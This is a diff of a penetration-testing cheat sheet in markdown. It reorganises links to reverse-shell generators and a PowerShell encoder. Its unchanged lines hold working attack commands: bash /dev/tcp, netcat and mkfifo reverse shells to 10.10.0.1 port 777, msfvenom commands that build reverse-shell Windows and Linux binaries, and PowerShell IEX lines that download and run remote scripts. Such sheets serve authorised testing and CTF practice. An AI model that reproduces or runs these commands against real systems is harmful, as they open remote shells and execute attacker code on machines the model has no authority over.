@@ -1,9 +1,9 @@
 sudo python3 -m http.server 80
 ## Linux reverse shell
 
-<a href="https://weibell.github.io/reverse-shell-generator/">Something</a>
+<a href="https://weibell.github.io/reverse-shell-generator/">Reverse Shell Generator</a>
+<a href="https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md">PayloadsAllTheThings Cheatsheet <3</a>
 ```bash
-https://weibell.github.io/reverse-shell-generator/
 bash -i >& /dev/tcp/10.10.0.1/777 0>&1
 nc -e /bin/bash 10.10.0.1 777
 rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.0.1 777 \>/tmp/f
@@ -14,7 +14,6 @@ msfvenom -p windows/shell_reverse_tcp LHOST=10.10.0.1 LPORT=777 -f exe > reverse
 msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=10.10.0.1 LPORT=777 -f elf >reverse.elf
 msfvenom -p linux/x86/shell_reverse_tcp LHOST=10.10.0.1 LPORT=777 -f elf >reverse.elf
 
-https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md
 ```
 ## Interactive shell
 ```bash
@@ -44,8 +43,10 @@ powershell.exe IEX (New-Object Net.WebClient).DownloadFile("")
 ## Download and run powershell script
 ```powershell
 powershell.exe IEX (New-Object Net.WebClient).DownloadString("")
-powershell.exe -e https://raikia.com/tool-powershell-encoder
+powershell.exe -e 
 ```
+<a href="https://raikia.com/tool-powershell-encoder">Powershell Encoder</a>
+  
 ## Powershell.exe Bit
 ```powershell
 [Environment]::Is64BitProcess
